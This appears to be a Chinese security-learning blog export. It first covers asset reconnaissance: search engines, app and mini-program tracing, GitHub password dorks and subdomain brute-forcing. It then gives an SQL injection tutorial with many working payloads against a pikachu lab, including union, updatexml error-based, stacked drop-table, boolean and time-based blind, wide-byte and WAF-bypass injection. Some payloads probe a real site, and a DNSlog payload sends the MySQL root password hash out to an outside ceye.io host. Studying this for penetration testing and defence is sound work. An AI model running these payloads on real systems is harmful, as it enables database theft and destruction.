-oB：二进制格式输出
-oX：XML格式输出

空间测绘平台工作原理: 通过爬取互联网设备信息建立数据库
360网络空间测绘 — 因为看见，所以安全
网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统
鹰图平台(hunter)-奇安信网络空间测绘系统
1、输入端口扫描的IP
2、使用IP聚合

APP资产搜集APP资产爱企查 
​	爱企查-工商查询_专业企业信息查询平台_公司查询_老板查询_工商信息查询系统

查询方法：通过企业名称在知识产权栏查询软件著作权信息
案例演示：查询”中邮邮惠万家银行”显示3个APP：邮惠万商APP、邮惠万村app、邮惠万家银行App
会员获取：可在拼多多购买7天试用超级会员（1元）

小蓝本
​	小蓝本-商业信息搜索

特点：免费使用，支持地区筛选
查询语法：关键词+空格+地区&#x3D;地区筛选
案例结果：查询到”邮惠万家银行”APP信息

七麦数据
​	七麦数据 -专业移动产品商业分析平台-关键词优化-ASA优化-七麦科技

功能：支持iOS&#x2F;安卓双平台查询
局限性：查询结果相对较少，需配合其他平台使用
会员价格：350元&#x2F;月（较贵）

点点数据
​	点点数据-App数据查询分析,AppStore排行榜,ASO,ASM优化平台

优势：数据量最全，支持多维度分析
功能：可查看开发者其他应用、版本历史等
案例：查询”隆基绿能”发现3个相关APP

查询技巧

多平台交叉验证
必要性：不同平台收录结果可能不同（如点点查到3个APP，七麦只查到2个）
验证方法：至少使用2个平台进行比对


开发者关联查询
操作路径：点击APP详情页的”开发者”信息
作用：可发现目标企业开发的其他关联APP



从APP提取资产抓包提取通过抓取APP运行时的网络数据包获取敏感信息

资产信息：IP地址、域名、网站、接口等基础设施
泄露信息：配置密钥(k)、源码资源文件等敏感数据
代码信息：Java代码安全问题等程序实现细节

优缺点：

优点
获取的数据都是实际使用的
没有”假阳性”结果


缺点
无法获取未触发的功能
需要人工操作可能遗漏部分功能
对复杂APP覆盖率有限



反编译提取逆向工程获取APP源码后提取关键信息
动态与静态分析

静态分析
定义：通过反编译APP获取源码后提取信息
特点：可能包含未实际使用的代码和配置


动态分析
定义：通过运行APP抓取实际交互数据
特点：只反映实际被调用的功能
示例：用户操作触发的网络请求


关键区别
静态提取可能获得未使用的”死代码”
动态提取只能获取实际触发的功能
两者提取方法和技术完全不同



优缺点：

优点
理论上可以获取APP所有代码
覆盖面更完整


缺点
可能提取大量无用信息
需要额外筛选有效数据
技术门槛较高



静态分析平台分析：

南明离火-移动安全分析平台

工具：
​	GitHub - kelvinBen&#x2F;AppInfoScanner	


扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录

python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir&gt;




扫描iOS应用的IPA文件、Mach-o文件、需要下载的IPA文件下载地址、保存需要扫描的文件目录

python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;




扫描Web站点的文件、目录、需要缓存的站点URl

python app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;

尽量搭配抓包进行补充
动态分析推荐工具: MobSF（Mobile Security Framework）
GitHub - MobSF
环境要求

需本地安装（服务器安装无法进行动态调试）
配合逍遥模拟器使用

安装流程

下载所需组件
运行steep.bat自动配置环境
执行run.bat启动服务（默认8000端口）

核心功能

动态分析

自动检测安卓运行时环境
支持活动启动、屏幕截图等基础操作


安全测试

检测证书校验机制（如根CA、公钥固定等）
提供绕过方案（集成Frida框架）


流量监控

捕获HTTPS明文通信
记录用户操作产生的请求


调试报告

包含屏幕操作记录
提取的域名信息（如sso域名）
接口调用详情（如登录请求参数）
安全风险分析（如SQL注入点）


优势对比

相比静态分析能获取运行时数据
相比单纯抓包提供更全面的调试功能
本地部署避免在线平台的会员限制



小程序应用小程序获取主要平台

微信
支付宝
抖音头条
百度

小程序结构
主体文件（必须放在根目录）

app.js：入口文件，类似于Java中的main方法
app.json：全局配置文件
app.wxss：全局样式文件

页面组成（每个页面由4个文件组成）

xxx.js：页面逻辑
xxx.json：页面配置
xxx.wxml：页面结构
xxx.wxss：页面样式

目录结构

pages：存放页面文件
utils：工具类文件夹
project.config.json：项目配置文件
sitemap.json：配置小程序是否允许被索引

搜索方法

直接在平台搜索框输入关键词即可查找目标小程序
可搜索的内容包括：小程序名称、网站标题、备案信息等
示例：在微信搜索”小迪”会显示相关关键词的小程序列表

小程序信息收集抓包技术获取小程序通信的IP或域名，为后续安全测试提供目标

核心工具：使用Proxifier与Burp Suite联动

Proxifier需要设置规则为监听WeChatApp.exe
收集内容

域名信息（如m.yht7.com）
API接口（如&#x2F;api&#x2F;inews&#x2F;9&#x2F;8）
请求参数和响应数据

小程序逆向文档参考
APP程序逆向
小程序多功能助手
小程序多功能助手
操作流程

扎到Wechat文件存储的目录
清空wxapkg缓存文件
运行目标小程序生成新包
使用工具选择_APP_.wxapkg文件
先执行解包再反编译（新版&#x2F;旧版根据小程序版本选择）
通过微信开发者工具导入反编译后的源码

查缺补漏公众号信息收集获取公众号1、爱企查查询

查询方法：在爱企查平台搜索企业名称，查看”知识产权”和”网站备案”栏目
关键信息：部分企业会在知识产权中泄露微信公众号信息，如成都生动网络科技有限公司案例
注意事项：显示微信号为零不代表真实没有，可能是收益手段

2、搜狗微信

搜索技巧：
直接搜索企业全称（如”成都生动网络科技有限公司”）
若无结果可尝试去掉部分关键词或使用简称
可通过”搜文章”功能查找相关交互内容


验证方法：搜索结果需人工判断是否为目标公众号

GitHub信息收集收集方式思路一​	查询源码泄露信息或数据泄露信息
基础语法：

in:name test：仓库标题搜索
in:description test：仓库描述搜索
stars:&gt;3000 test：stars数量过滤

高级技巧：组合使用password in:file等语法可发现敏感信息
eg.1

x-bull.com password in:file

通过结果进行人工检查泄露信息与目标的关联性
其他语句


库标题搜索：使用in:name test可搜索仓库标题含关键字的项目
描述搜索：in:description test可搜索仓库描述含关键字的项目
Readme搜索：in:readme test可搜索Readme文件含关键字的项目
星标筛选：
stars:&gt;3000 test筛选星标大于3000的项目
stars:1000..3000 test筛选星标在1000-3000之间的项目


分支筛选：
forks:&gt;1000 test筛选分支数大于1000的项目
forks:1000..8000 test筛选分支数在1000-8000之间的项目




思路二收集人员和邮箱信息

域名搜索：基于目标网站域名进行信息收集，如搜索”edu.cn”等教育机构域名
人员信息搜索：通过开发人员姓名、邮箱等个人信息进行检索，适用于查找个人相关的代码提交
混合搜索：可同时使用”域名+邮箱”等组合条件提高搜索精准度

Github监控通过监控github检测是否有源代码泄露
工具推荐

NHPT&#x2F;FireEyeGoldCrystal: 一个GitHub监控和信息收集工具，支持监控和收集CVE、免杀、漏洞利用等内置关键字和自定义关键字。
VKSRC&#x2F;Github-Monitor: Github Sensitive Information Leakage Monitor(Github信息泄漏监控系统)
madneal&#x2F;gshark: Scan for sensitive information easily and effectively.

确保与GitHub的稳定连接
网盘信息收集主要收集
​	存储企业招标人员信息、业务产品和业务员资料等各类文件（包括但不限于网站源码、公司Excel表格、企业招标信息、企业介绍文档等）
搜索方式：

盘搜搜：网盘搜索,就上盘搜搜 - 好用的百度云搜索引擎
盘多多：http://www.panduoduo.net
大力盘：https://dalipan.com

软件推荐：
混合盘 - 自定义规则类APP - 可搜索全网网盘、磁力资源
通常作为辅助手段
证书搜索
核心原理：通过SSL&#x2F;TLS证书关联资产
操作方法：
获取目标网站证书
提取证书域名信息
使用特定语法搜索（如cert:）


支持平台：Fofa、Quake等网络空间搜索引擎

暴力破解通过枚举的方式，爆破目录信息或者子域名信息

OneForAll：https://github.com/shmilylty/OneForAll
ksudbomain：https://github.com/knownsec/ksubdomain
subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
Sublist3r:  https://github.com/aboul3la/Sublist3r
子域名挖掘机：https://github.com/euphrat1ca/LayerDomainFinder
dirsearch：https://github.com/maurosoria/dirsearch

自动化工具推荐F8X自动化部署工具项目地址
​	ffffffff0x&#x2F;f8x: 红&#x2F;蓝队环境自动化部署工具 | Red&#x2F;Blue team environment automation deployment tool
项目概述
​	f8x是一款红蓝队环境自动化部署工具，支持多种场景的渗透测试、开发和代理环境搭建。
功能特色：

支持一键部署ARL、MobSF等常见安全工具环境
可自动安装CobaltStrike、Metasploit等红队工具
支持Docker环境快速部署

使用方法：


wget : wget -O f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x
curl : curl -o f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x

bash f8x -h





AsamF综合资产测绘工具项目地址
​	Kento-Sec&#x2F;AsamF: AsamF是集成Fofa、Quake、Hunter、Shodan、Zoomeye、Chinaz、0.zone及爱企查的一站式企业信息资产收集、网络资产测绘工具。
项目概述
​	AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key，在搜索前加入对应选择key的flag可以自由切换需要使用的key。可以通过info命令来查看该key的账户信息。Union命令将联合Fofa、Hunter、Quake、Zoomeye内置的语法格式进行搜索。所有的命令、子命令都支持短命令使用。
使用方法
AsamF_windows_amd64.exe -h #在~/.config/asamf/生成的config.json文件进行配置#自动结果保存在~/asamf/目录下。常用参数：NAME:   AsamF - 一站式资产收集处理工具USAGE:   AsamF_windows_amd64.exe [global options] command [command options] [arguments...]VERSION:   0.2.5COMMANDS:   fofa, f     使用Fofa搜索。   zoomeye, z  使用Zoomeye搜索。   hunter, h   使用Hunter搜索。   quake, q    使用Quake搜索。   shodan, s   使用Shodan搜索。   cn          使用cn命令搜索公司信息。   0zone, 0    使用Ozone搜索.   myip        查看您的IP。   vuln, v     搜索漏洞功能。不添加-q参数将搜索最新的30个漏洞信息。   help, h     Shows a list of commands or help for one commandGLOBAL OPTIONS:   --help, -h     show help   --version, -v  print the version







ENScan Go 企业信息收集工具项目地址：wgpsec&#x2F;ENScan_GO: 一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。支持MCP接入

使用方法

1、初次使用生成配置文件
./enscan -v

2、使用参数
Usage of enscan-v1.2.1-windows-amd64.exe:  -api        API模式运行  -branch        查询分支机构（分公司）信息  -branch-filter string        提供一个正则表达式，名称匹配该正则的分支机构和子公司会被跳过  -debug        是否显示debug详细信息  -deep int        递归搜索n层公司 (default 1)  -delay int        每个请求延迟（S）-1为随机延迟1-5S  -f string        批量查询，文本按行分隔  -field string        获取字段信息 eg icp  -hold        是否查询控股公司  -i string        公司PID  -invest float        投资比例 eg 100  -is-branch        深度查询分支机构信息（数量巨大）  -is-group        查询关键词为集团  -is-pid        批量查询文件是否为公司PID  -is-show        是否展示信息输出 (default true)  -json        json导出  -mcp        MCP模式运行  -n string        关键词 eg 小米  -no-merge        开启后查询文件将单独导出  -out-dir string        结果输出的文件夹位置(默认为outs)  -out-type string        导出的文件后缀 默认xlsx (default “xlsx”)  -out-update string        导出指定范围文件，自更新  -proxy string        设置代理  -supplier        是否查询供应商信息  -timeout int        每个请求默认1（分钟）超时 (default 1)  -type string        查询渠道，可多选 (default “aqc”)  -v    版本信息

ARL灯塔项目地址
Aabyss-Team&#x2F;ARL: ARL官方仓库备份项目：ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。
使用方法

1、安装
#国外wget https://raw.githubusercontent.com/Aabyss-Team/ARL/master/misc/setup-arl.shchmod +x setup-arl.sh./setup-arl.sh#国内wget https://raw.gitcode.com/msmoshang/ARL/blobs/24b06ec7efb32b9be380ab01ebf505e77c7811bf/setup-arl.shchmod +x setup-arl.sh./setup-arl.sh

2、访问web页面
源码安装后，请前往ARL-Web页面：https://IP:5003/
原账号密码：admin,arlpass
新版账号密码为随机生成，会打印在控制台

Nemo 信息收集平台项目地址
​	hanc00l&#x2F;nemo_go: Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率。
安装方法
​	https://github.com/hanc00l/nemo_go/blob/main/v3/docs/install.md
使用方法
​	https://github.com/hanc00l/nemo_go/blob/main/v3/docs/quickstart.md
All-Defense-Tool武器库项目地址：
guchangan1&#x2F;All-Defense-Tool: 本项目集成了全网优秀的攻防武器工具项目，包含自动化利用，子域名、目录扫描、端口扫描等信息收集工具，各大中间件、cms、OA漏洞利用工具，爆破工具、内网横向、免杀、社工钓鱼以及应急响应、甲方安全资料等其他安全攻防资料。
]]></content>
      <categories>
        <category>网络安全</category>
        <category>小迪安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>小迪安全</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--Web十大常规漏洞(2)</title>
    <url>/posts/caf167a2.html</url>
    <content><![CDATA[SQL注入漏洞注入概念1.1.1 什么是注入漏洞（SQL）
​	接收相关参数未经过处理直接带入数据库查询操作
具备的两个关键点：

用户能够控制输入（网站交互操作）
原本程序接受了用户输入的信息，并且直接执行（没有做过滤）

1.1.2 SQL注入漏洞的分类&#x2F;特点
​	服务端漏洞（数据库服务-代码有逻辑问题）
​	与操作系统、数据库类型、脚本语言类型无关
1.1.3 SQL漏洞产生原理
​	代码中没有对用户的传入参数信息，做处理
1.1.4 SQL注入的目的

窃取数据信息
修改数据信息
破坏数据信息

1.1.5 SQL注入攻击流程：

获取攻击网站域名（子域名）
获取攻击网站注入点
获取网站业务数据库名称
获取网站业务数据表名称
获取网站业务表字段信息
获取网站业务真实数据（SQL注入目的：窃取数据）
利用联合注入获取数据信息（配合order by获取字段数）


实现篡改或破坏数据 （堆叠注入）

漏洞点查找SQL漏洞点获取

登录的地方、更新的地方、注册的地方、留言板、查询、删除等
HTTP Header:
UA：用户指纹信息 chrome – 加载到数据库
UA指纹信息存储，可以用于判断是否存在盗号行为


cookie：用户登录信息
referer：记录上一个页面的地址，常用于推广记录流量信息


与数据库交互的相关页面
http://www.\*\*.com/\*\*.asp?id=xx	 (ASP注入)
http://www.\*\*.com/\*\*.php?id=xx	(PHP注入)
http://www.\*\*.com/\*\*.jsp?id=xx	  (JSP注入)



举例：pikachu靶场注册用户案例
访问：Get the pikachu

在提交注册前，进行请求包抓取
在burp suit中请求包发送到重发器
修改请求主体信息，加单引号
利用报错函数信息，获取数据库表名称

	
伪静态如何实现SQL注入漏洞：

伪静态：一般是中间件加载了伪静态插件代码，其实不是真正的静态页面

伪静态例：
​	https://www.oldboyedu.com/zuixin_wenzhang/index/id/523
&#x3D;&#x3D;&#x3D; https://www.oldboyedu.com/zuixin_wenzhang/index?id=523
验证方式
​	https://www.oldboyedu.com/zuixin_wenzhang/index/id/523
​	https://www.oldboyedu.com/zuixin_wenzhang/index/id/523\%20\%26\%26\%20-1=-2
注意：该网站配置了WAF防火墙，需要通过URL编码的方式进行绕过，因为对and进行了过滤，即使用&amp;&amp;进行代替
漏洞检测检测SQL漏洞
根据有没有回显分为报错注入和盲注两种方式
通过错误信息获取漏洞信息​	id&#x3D;1 and 1&#x3D;1	&#x3D;&#x3D;&gt;	select * from user where id&#x3D;1 and 1&#x3D;1 ;	—-成功-真
​	id&#x3D;1 and 1&#x3D;2	&#x3D;&#x3D;&gt;	select * from user where id&#x3D;1 and 1&#x3D;2 ;	—-失败-假
&#x3D;&#x3D;&#x3D;&gt; 执行结果不一致，存在漏洞（使用单引号也可以）
针对不同代码实现漏洞绕过：

geekgold’ or 1&#x3D;1 – 	(针对asp代码的sql漏洞)
geekgold’ or 1&#x3D;1 #            (针对php代码的sql漏洞)

规避SQL注入漏洞，需要对用户传入的信息做处理
通过盲注的方式获取漏洞信息1.3.2.1 基于布尔逻辑的盲注检测
方法：通过构造布尔条件（如-1&#x3D;-1或-1&#x3D;-2）来观察浏览器的响应是否有变化
示例：		

正常请求：http://example.com/page?id=1
盲注测试：http://example.com/page?id=1 AND 1=1
盲注测试：http://example.com/page?id=1 AND 1=2

结果：如果1=1时页面正常显示，而1=2时页面显示异常（如空白页面或错误信息），则可能存在盲注漏洞。
1.3.2.2 基于时间函数的盲注检测
方法：通过构造带有时间函数的SQL语句，观察浏览器的响应时间是否有变化
示例：

正常请求：http://example.com/page?id=1
盲注测试：http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)

结果：如果页面响应时间明显延迟（如5秒），则可能存在盲注漏洞。
漏洞提交方式GET 方式进行提交GET方式提交通常会在url后有参数赋值的信息
典型页面： http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php

通过bp进行抓包查看：
​	
漏洞验证：http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+\%27+or+1\%3D1+\%23&amp;submit=\%E6\%9F\%A5\%E8\%AF\%A2
POST方式进行提交POST方式进行提交：一般情况下用户输入的内容被隐藏起来了，地址栏看不到，需要借助抓包工具进行抓包
典型页面：http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php

通过bp进行抓包查看：

验证漏洞：利用bp重发器（id&#x3D;2’&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2）修改请求主体信息
Cookie方式进行提交原理
ASP脚本中的request对象，被用于从用户那里获取信息。
Request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错
eg获取从表单中提交的数据时：request.form(“参数名称”)
ASP中规定也可以省略集合名称：request(“参数名称”)，当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，可能存在Cookie注入
典型页面：http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php
在http请求头，cookie字段后面，添加SQL注入信息

HEAD方式进行提交典型页面：http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php

使用bp抓包

验证方式：通过Bp重发器，在UA后面加入’进行验证

漏洞类型数字类型传入数据库的信息是数值信息
典型页面：http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php
 交互原理：
   $id&#x3D;$_POST[‘id’];
   $query&#x3D;”select username,email from member where id&#x3D;$id”;   id&#x3D;1   select username,email from member where id&#x3D;1;   利用漏洞：会将所有数据信息都展示出来   id&#x3D;1 or 1&#x3D;1
字符类型传入数据的信息是字符信息
典型页面：http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php
   交互原理：   $name&#x3D;$_GET[‘name’];
   $query&#x3D;”select id,email from member where username&#x3D;’$name’”;   name&#x3D;xiaoq   select id,email from member where username&#x3D;’xiaoq’   利用漏洞：   xiaoq’ or 1&#x3D;1 #
搜索类型  模糊匹配查询数据，传输数据库信息是任意字符信息
  典型页面：http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php  交互原理：   $name&#x3D;$_GET[‘name’];
   $query&#x3D;”select username,id,email from member where username like ‘%$name%‘“;   name&#x3D;xiaoq   select username,id,email from member where username like ‘%xiaoq%‘
   利用漏洞： 
   select username,id,email from member where username like ‘%xiaoq%‘ or 1&#x3D;1 #%‘
   xxx%‘ or 1&#x3D;1 #
特殊类型 精确匹配查询数据，传输数据库信息是任意字符信息，也称为XX型
 典型页面：http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php   交互原理：   $name&#x3D;$_GET[‘name’];
   $query&#x3D;”select id,email from member where username&#x3D;(‘$name’)”;   name&#x3D;xiaoq   select id,email from member where username&#x3D;(‘xiaoq’)   利用漏洞：   w’) or 1&#x3D;1 #
攻击方式union注入union操作符用于合并两个或多个SQL语句指令信息，得到联合的查询结果；
使用示例：
MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union select name,age from teac where name=&#x27;zhangwu&#x27;;+---------+------+| name    | age  |+---------+------+| zhangwu |   24 |+---------+------+1 row in set (0.00 sec)#union all 不会进行重复值的过滤MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union all select name,age from teac where name=&#x27;zhangwu&#x27;;+---------+------+| name    | age  |+---------+------+| zhangwu |   24 || zhangwu |   24 |+---------+------+2 rows in set (0.00 sec)



典型页面：http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php
注意：当主查询语句和子查询语句中的字段个数不一致时，将会报错select name,age,render from stu where name&#x3D;’zhangwu’ union all select name,age from teac where name&#x3D;’zhangwu’;错误提示：The used SELECT statements have a different number of columns
解决方法思路：需要判断主查询语句的字段个数，通过order by 排序实现
a\%&#x27;  order by 3 #    用户名中含有a\%&#x27; order by 3 #的结果如下：    username：allen    uid:2    email is: allen@pikachu.com    username：grady    uid:4    email is: grady@pikachu.coma\%&#x27;  order by 4 #	报错：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;		##说明 主查询语句中字段数量为3



知道字段数之后通过占位进行注入
a\%&#x27; union select username,email,version() from member #	    用户名中含有a\%&#x27; union select username,email,version() from member #的结果如下：    username：allen    uid:2    email is: allen@pikachu.com    username：grady    uid:4    email is: grady@pikachu.com    username：vince    uid:vince@pikachu.com    email is: 5.5.53	.................常用的函数：	USER();		VERSION();  	DATABASE();  



information_schema注入information_schema是MYSQL 5.0之后数据库中默认的数据库，此数据库中有数据库的元数据信息，包含了一些数据库统计信息（有哪些库、表、字段、数据存储量、应用索引数量）
典型页面：http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php
应用方式

获取数据库的库名
vince’ union select database(),user(),3#%


获取数据库的表名
u’ union select table_schema,table_name,3 from information_schema.tables where table_schema&#x3D;’pikachu’#


获取数据库表中的字段
k’ union select table_name,column_name,3 from information_schema.columns where table_name&#x3D;’user’#%


获取数据库的数据
kobe’union select username ,password,3 from users#%



常规方法应用步骤
#1、获取所有数据库表明SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;#2、获取当前数据库的表名SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE();#3、获取指定表的列名SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = &#x27;users&#x27;;#4、获取所有数据库的表名SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;#5、获取所有数据库的列名SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS;#6、获取表的数据SELECT username, password FROM users;



报错函数注入报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点，如果不符合数据库语法规则就会产生错误
常用函数：
​	updatexml（）	:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.
​	extractvalue（）     :函数也是MYSQL对XML文档数据进行查询的XPATH函数.​	floor（）		   :MYSQL中用来取整的函数.
典型网站：http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php
updatexml实战测试：
#1、爆数据库版本信息a\%&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) ##2、爆数据库当前用户a\%&#x27; and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#  #3、爆数据库a\%&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ##4、爆表,但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示a\%&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),0x7e),1) ##5、爆字段a\%&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27;limit 2,1)),0)##6、爆字段内容a\%&#x27; and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#













堆叠注入c

与union区别：
堆叠注入方式和union联合注入方式类似，都是实现多个SQL语句命令拼接，同时执行操作，但是union联合注入只能实现多个select语句拼接，不能实现其他语句拼接，然而堆叠注入，还可以实现拼接其他SQL类型语句，实现操作数据库。

PS：需要关注用户权限  
举例
1.新建一个表 select * from users where id=1;create table test like users; 2.删除上面新建的test表select * from users where id=1;drop table test;3.查询数据select * from users where id=1;select 1,2,3;





盲注方式适用场景：应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。
基于布尔类型的SQL盲注
页面仅返回两种状态（如登录成功&#x2F;失败、数据存在&#x2F;不存在）
无法通过联合查询或报错注入直接获取数据

select ascii(substr(database(),1,1))&gt;xx;通过对比ascii码的长度，判断出数据库表名的第一个字符。
database() – 输出数据库名称信息  		  pikachu1,1        – 取出数据库名称第一个字符		psubstr()   – 数据库名称字符调取出来  	     pascii	   – 将字符信息转成编码数值   	    112（是可以识别，也不会显示）
&gt;113 &lt;111 &#x3D;112  – 通过112编码反向处理 112 - p（确认）
vince’ and ascii(substr(database(),1,1))&#x3D;112#  – 推断出数据库名称第一个字母 p 
流程举例
1、判断注入点以及闭合方式
id=1&#x27; and &#x27;1&#x27;=&#x27;1  -- 正常响应（True）id=1&#x27; and &#x27;1&#x27;=&#x27;2  -- 异常响应（False）



2、获取数据库名
①判断数据库名长度
id=1&#x27; and length(database())=8 --+

通过二分法逐步调整数值（如 &gt;10、&lt;5）最终确定长度。
②逐个字符猜解数据库名
id=1&#x27; and ascii(substr(database(),1,1))=115 --+

通过ASCII码逐个字符判断（substr(database(),n,1) 截取第n位字符）
3、获取表名
①判断表数量及表名长度
id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 --+id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+

②逐字符猜解表名
id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109 --+



4、获取字段名
①判断字符数量及字段长度
id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=3 --+id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))=4 --+

②逐字符猜解字段名
id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105 --+



5、提取数据内容
①判断数据长度
id=1&#x27; and length((select username from users limit 0,1))=5 --+

②逐字符猜解数据
id=1&#x27; and ascii(substr((select username from users limit 0,1),1,1))=97 --+











基于时间类型的SQL盲注基于时间类型的SQL盲注（Time-Based Blind SQL Injection）是一种通过观察数据库响应时间差异来推断信息的注入技术，常用于无法直接获取数据回显的场景。
常用延时函数：

MySQL：SLEEP(5)、BENCHMARK(10000000,MD5(‘test’)) 
SQL Server：WAITFOR DELAY ‘0:0:5’ 
PostgreSQL：PG_SLEEP(5)

测试方法：
一、判断注入点及注入类型

基础测试

在参数后添加延时函数，观察页面响应时间是否显著增加：
&#x27; AND SLEEP(5)--

如果页面响应延迟约5秒，则可能存在时间盲注漏洞。

闭合方式测试
根据参数闭合方式调整Payload（如单引号、双引号等）：


&quot; OR IF(1=1,SLEEP(5),0)--





二、获取数据库信息 
1.获取数据库名 
判断数据库名长度  
&#x27; AND IF(LENGTH(DATABASE())=N, SLEEP(5),0)-- 

 逐步替换N，直到响应延迟，确定长度。 
​	逐字符猜解数据库名  
&#x27; AND IF(ASCII(SUBSTR(DATABASE(),1,1))=N, SLEEP(5),0)-- 

替换N为ASCII码（如97对应字符a），逐个字符猜解。  
2.获取表名
 猜解表数量  
&#x27; AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=N, SLEEP(5),0)-- 

 逐表猜解表名
&#x27; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1))=N, SLEEP(5),0)-- 

通过LIMIT遍历所有表，逐字符猜解表名。  
3.获取字段名 
猜解字段数量 
&#x27; AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;users&#x27;)=N, SLEEP(5),0)-- 

逐字段猜解名称 
&#x27; AND IF(ASCII(SUBSTR((SELECT columnname FROM informationschema.columns WHERE table_name=&#x27;users&#x27; LIMIT 0,1),1,1))=N, SLEEP(5),0)- 



4.提取数据 
猜解字段内容 
&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=N, SLEEP(5),0)-











DNSlog注入DNSlog注入学习 - Lushun - 博客园
以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。
payload：
&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.zs69k2.ceye.io\\abc&#x27;))),1,0)--+


利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog

SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;));



宽字节注入当php开启magic_quotes_gpc（魔术引号开关，可以将SQL注入语句中的单引号转换为字符信息）宽字节注入可以在开启魔术引号开启之后，还原引号的功能
magic_quotes_gpc：通过在引号’前面添加转义字符”\“使引号’失去含义
思路：
&#39; -&gt; url编码 -&gt; %5c%27 -&gt; %df%5c %27  -&gt; 縗’
%df 	&#x3D;&#x3D; ß%df%5c	&#x3D;&#x3D; 縗
通过在%5c前面添加%df从而使%27逃匿出来，组成为%df%5c%27
注意：宽字节注入时，需要确定数据库的字符集为GBK编码
实战应用数据库类型确认方式使用内置变量爆数据库类型“User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型。通过提交查询该变量，根据返回的出错信息即可得知数据库类型。
使用语句：
​	and user&gt;0
​	该查询语句会将user对应的nvarchar型值与int数字型的0进行对比，两个数据类型不一致，因此会返回出错信息。
1、MsSQL报错信息：
​	Microsoft OLE DB Provider for SQL Server 错误’80040e21’
​	将nvarchar值’****’转换为数据类型为int的列时发生语法错误。
2、Access报错信息：
​	Microsoft OLE DB Provider Drivers ODBC Drivers 错误 ‘80040e21’
